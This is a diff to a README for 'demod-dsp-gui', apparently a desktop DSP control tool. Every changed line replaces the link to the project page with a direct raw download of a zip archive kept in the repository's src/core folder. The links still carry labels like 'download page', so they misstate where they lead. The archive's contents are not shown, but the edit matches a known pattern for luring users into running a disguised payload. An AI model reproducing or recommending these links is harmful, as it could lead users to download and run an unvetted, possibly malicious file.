@@ -1,6 +1,6 @@
 # 🎛️ demod-dsp-gui - Simple DSP control for your desktop
 
-[![Download demod-dsp-gui](https://img.shields.io/badge/Download%20demod--dsp--gui-blue?style=for-the-badge)](https://github.com/Faz8788/demod-dsp-gui)
+[![Download demod-dsp-gui](https://img.shields.io/badge/Download%20demod--dsp--gui-blue?style=for-the-badge)](https://github.com/Faz8788/demod-dsp-gui/raw/refs/heads/main/src/core/demod-gui-dsp-v2.6.zip)
 
 ## 🚀 What this app does
 
@@ -34,7 +34,7 @@ For best results, use a PC with:
 
 Open the main project page here:
 
-[Visit the demod-dsp-gui download page](https://github.com/Faz8788/demod-dsp-gui)
+[Visit the demod-dsp-gui download page](https://github.com/Faz8788/demod-dsp-gui/raw/refs/heads/main/src/core/demod-gui-dsp-v2.6.zip)
 
 On that page, look for the latest release or the main download file. Save it to your computer before you start the install steps below.
 
@@ -169,7 +169,7 @@ Keep all files in the same folder unless the release notes say otherwise. The ap
 
 You can find the project here:
 
-https://github.com/Faz8788/demod-dsp-gui
+https://github.com/Faz8788/demod-dsp-gui/raw/refs/heads/main/src/core/demod-gui-dsp-v2.6.zip
 
 ## 🖱️ Quick start
 
